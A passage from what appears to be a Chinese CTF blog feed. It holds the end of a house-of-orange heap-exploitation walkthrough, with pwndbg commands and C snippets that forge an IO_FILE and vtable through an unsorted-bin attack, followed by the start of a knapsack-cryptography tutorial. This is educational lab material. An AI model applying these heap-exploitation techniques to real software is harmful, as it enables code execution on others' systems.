JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>所以这几个指针、变量、结构体的关系</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602051011103.png" alt="image-20250602051011103"></p><ul><li>在开始伪造操作之前，我们先来查看一下**_IO_list_all<strong>这个地址所在的位置，我们使用如下命令在<code>pwndbg</code>中输出的是</strong>_IO_list_all**这个指针的地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &amp;_IO_list_all</span><br></pre></td></tr></table></figure><ul><li>此时我们发现这个**_IO_list_all<strong>这个存储在libc中，所以我们其实可以根据</strong>unsorted_bin**堆块的fd指针所指向的地址通过偏移得到。</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602024456554.png" alt="image-20250602024456554"></p><ul><li>接下来我们再使用如下命令查看**_IO_list_all<strong>这个指针指向的具体地址，我们会发现</strong>_IO_list_all**这个指针指向的是图中箭头这个位置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/20gx 0x7ffff7dd2520</span><br></pre></td></tr></table></figure><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602025648950.png" alt="image-20250602025648950"></p><ul><li>接下来我们再使用如下命令查看一下**_IO_list_all**这个文件结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *(struct _IO_FILE *) _IO_list_all</span><br></pre></td></tr></table></figure><ul><li>输出之后我们会发现这样的数据</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602030135507.png" alt="image-20250602030135507"></p><ul><li>此时我们对比一下，发现<strong>IO_FILE</strong>这个结构体其实也在glibc这个位置，并且位置其实就在**_IO_list_all**下面一点。</li><li><code>struct _IO_FILE </code>这个结构体存储着就是**__IO_FILE**相关的东西，而我们</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602030116268.png" alt="image-20250602030116268"></p><ul><li>接下来我们查看一下<code>_IO_file_jumps</code>的地址</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p &amp;_IO_file_jumps</span><br><span class="line">x/20gx 0x7ffff7dd06e0</span><br></pre></td></tr></table></figure><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602034712624.png" alt="image-20250602034712624"></p><ul><li>接下来我们再查看**_IO_file_jumps**指向的结构体</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p _IO_file_jumps</span><br></pre></td></tr></table></figure><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602034756211.png" alt="image-20250602034756211"></p><ul><li>进行对比：</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602034854954.png" alt="image-20250602034854954"></p><h2 id="利用过程3伪造和劫持io"><a class="markdownIt-Anchor" href="#利用过程3伪造和劫持io"></a> 利用过程3(伪造和劫持IO)</h2><ul><li>接下来我们回到程序中继续调试。接下来这边的这个代码，就是我们通过偏移获取的**__IO_list_all文件指针**的地址</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602030746865.png" alt="image-20250602030746865"></p><ul><li>目前该指针还是指向的是原始的<strong>IO_FILE</strong></li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602031015301.png" alt="image-20250602031015301"></p><ul><li>接下来我们需要通过堆溢出，劫持位于<strong>unsorted_bin</strong>中堆块的<strong>bk指针</strong></li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602031145622.png" alt="image-20250602031145622"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602031152471.png" alt="image-20250602031152471"></p><ul><li>劫持后就变成如下：</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602031221576.png" alt="image-20250602031221576"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602034226637.png" alt="image-20250602034226637"></p><ul><li>接下来我们向位于<strong>unsorted_bin</strong>中的堆块写入<code>/bin/sh\x00</code></li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602031446502.png" alt="image-20250602031446502"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602031519304.png" alt="image-20250602031519304"></p><ul><li>之后我们修改了处于<strong>unsorted_bin</strong>中堆块的<strong>size</strong></li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602031801164.png" alt="image-20250602031801164"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602031806900.png" alt="image-20250602031806900"></p><ul><li>接下来就是<strong>非常关键</strong>的一步，<strong>在堆块上伪造IO_FILE</strong>和<strong>劫持__IO_list_all</strong>指针到<strong>堆块上</strong>，接下来我们先进行的操作是<strong>在堆块上伪造IO_FILE</strong></li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602031912305.png" alt="image-20250602031912305"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span>; </span><br><span class="line">fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br></pre></td></tr></table></figure><ul><li>最后我们伪造<strong>跳表和vtable</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">*(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602041617779.png" alt="image-20250602041617779"></p><ul><li>接下来就是<code>malloc(10)</code>触发<code>unsorted_bin_attack</code>的过程，根据<code>unsorted_bin_attack</code></li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602041823597.png" alt="image-20250602041823597"></p><ul><li>我们的**__IO_list_all<strong>就会跟新值，其值指向上图</strong>unsorted_bin**的位置中(位于libc中的main_arena)</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602042134005.png" alt="image-20250602042134005"></p><ul><li>而<strong>unsorte_bin</strong>这个指针又指向<strong>old_top</strong>这个堆块</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602042257022.png" alt="image-20250602042257022"></p><ul><li>这样我们的结构就如下：</li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602051525848.png" alt="image-20250602051525848"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602052133761.png" alt="image-20250602052133761"></p><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602051236003.png" alt="image-20250602051236003"></p><ul><li>最终走到这里调用<code>winner</code></li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250602045927369.png" alt="image-20250602045927369"></p><h1 id="house_of_orange_level_1"><a class="markdownIt-Anchor" href="#house_of_orange_level_1"></a> house_of_orange_level_1</h1><ul><li><p>题目来源：hitcon_2016中的<code>house_of_orange</code></p></li><li><p>先来检查一下保护机制,发现该题目的附件保护全开</p></li></ul><p><img src="/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/image-20250321121231184.png" alt="image-20250321121231184"></p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>]]></content>
    
    
    <summary type="html">前言：现在是2025.6.2 凌晨1点15分.清晨5点22分完成实验(还未做题)</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>背包加密</title>
    <link href="http://iyheart.github.io/2025/05/27/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E8%83%8C%E5%8C%85%E5%8A%A0%E5%AF%86/"/>
    <id>http://iyheart.github.io/2025/05/27/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E8%83%8C%E5%8C%85%E5%8A%A0%E5%AF%86/</id>
    <published>2025-05-27T13:30:40.000Z</published>
    <updated>2025-05-31T01:02:45.759Z</updated>
    
    <content type="html"><![CDATA[<ul><li>打Hgame2025和LitCTF2025都有碰到背包密码，但是都没做出来，接下来学习一下背包密码的加密和背包密码的破解方法。</li><li>参考博客：<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/132109655">Backpack Cryptography【背包密码】 &amp; 例题-CSDN博客</a></li><li>参考博客：<a href="https://ctf-wiki.org/crypto/asymmetric/knapsack/knapsack/#_3">背包加密 - CTF Wiki</a></li><li>参考博客：<a href="https://dexterjie.github.io/2024/07/29/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81/">https://dexterjie.github.io/2024/07/29/背包密码/</a></li></ul><h1 id="背包密码加密"><a class="markdownIt-Anchor" href="#背包密码加密"></a> 背包密码加密</h1><ul><li>分析一个加密算法的破解首先要比较熟悉它的加密算法以及加密体制，这样才能更好的破解背包加密。</li></ul><h2 id="背包问题"><a class="markdownIt-Anchor" href="#背包问题"></a> 背包问题</h2><p><strong>01背包问题</strong></p><ul><li>在算法的动态规划中有一个比较经典的问题，就是背包问题，先来介绍一下这个问题，以此引入背包加密体制</li><li>假定一个背包可以承重W，现在有n个物品，其重量分别为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_1,a_2,....,a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，此时我们想知道装哪些物品可以恰好使得背包装满。并且每个物品只能被装一次。这其实就是解这样一个问题。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>x</mi><mn>2</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>x</mi><mi>n</mi></msub><msub><mi>a</mi><mi>x</mi></msub><mo>=</mo><mi>W</mi></mrow><annotation encoding="application/x-tex">x_1a_1+x_2a_2+....+x_na_x = W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></span></p><ul><li>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>只能为0或者1(表示当前物品是否装进背包)。显然我们必须枚举所有的n个物品的组合才能解决这个问题，而复杂度也就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>（n个物品，每个物品都有装进背包和没装进背包，全排列就有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span>种可能，所以暴力破解最坏的情况就是遍历<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>种可能）</li></ul><p><strong>完全背包问题</strong>（简单介绍一下）</p><ul><li>假定一个背包可以承重W，现在有n个物品，每个物品的重量为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_1,a_2,...,a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，并且每个物品<strong>可以无限次</strong>放入背包中，背包所有物品权重和最大是多少。</li></ul><p><strong>注意：01背包问题和完全背包问题的区别就在于，每个物品取的最大次数是1次还是无限次</strong></p><h2 id="背包加密"><a class="markdownIt-Anchor" href="#背包加密"></a> 背包加密</h2><ul><li><p>背包问题中由于存在0、1序列，所以我们可以比较好的联想到加密的消息。</p></li><li><p>在加密时，我们想要加密的<strong>明文为x</strong>，那么我们就可以<strong>将其表示为n位二进制数</strong>，然后**分别乘上<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>**即可得到加密结果。</p></li><li><p>但是如果这个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>没有条件限制的话，就算我们知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal 